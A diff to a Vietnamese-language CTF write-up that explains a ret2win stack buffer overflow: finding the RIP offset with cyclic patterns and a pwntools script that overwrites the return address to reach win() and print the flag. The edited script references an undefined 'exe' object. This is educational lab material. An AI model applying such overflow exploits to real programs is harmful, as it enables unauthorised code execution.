@@ -54,19 +54,25 @@ checksec chall1
 ```bash
 cyclic 100
 ```
+**Mục đích:**
+- Tạo chuỗi nhập mẫu có cấu trúc đặc biệt (vd: aaaabaaacaaad...). Khi chương trình crash, giá trị RIP sẽ trỏ vào 1 phần của chuỗi này, giúp tính toán offset chính xác.
 
 
 ## Khi chương trình crash, kiểm tra giá trị RIP:
 ```bash
 info registers rip
 ```
+**Mục đích:**
+- Lấy giá trị thanh ghi RIP (Instruction Pointer) khi crash. Ví dụ: 0x6161616161616166
 
 
 ## Tìm offset từ giá trị RIP:
 ```bash
 cyclic -l <giá_trị_rip>
 ```
-
+**Mục đích:**
+- Xác định chính xác số byte cần nhập để ghi đè lên RIP.
+Ví dụ: Output 40 → Cần 40 byte để kiểm soát RIP.
 
 ## Tìm địa chỉ hàm win
 ```bash
@@ -81,17 +87,27 @@ from pwn import *
 p = process('./chall_ret2win')
 
 offset = 40                    #Độ dài offset
-win_addr = 0x401156            #Địa chỉ hàm win
 
 payload = b'A' * offset        #Tạo input gây BOF
-payload += p64(win_addr)       #Ghi đè địa chỉ hàm win lên return address
+payload += p64(exe.sym['win'])       #Ghi đè địa chỉ hàm win lên return address
 
 p.sendline(payload)
 p.interactive()
 ```
+**Giải thích chi tiết:**
+
+- b'A' * offset: Điền đầy buffer + padding → Chạm tới vị trí RIP
+
+- p64(exe.sym['win']): Ghi đè RIP bằng địa chỉ hàm win() (đóng gói dạng 64-bit little-endian)
+
+- Khi hàm vulnerable() return, thay vì quay về main(), nó nhảy vào win() → In flag
 
 
 ## Chạy script
 ```bash
   python3 solve1.py
+```
+**Kết quả khi thành công:**
+```
+WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}
 ```
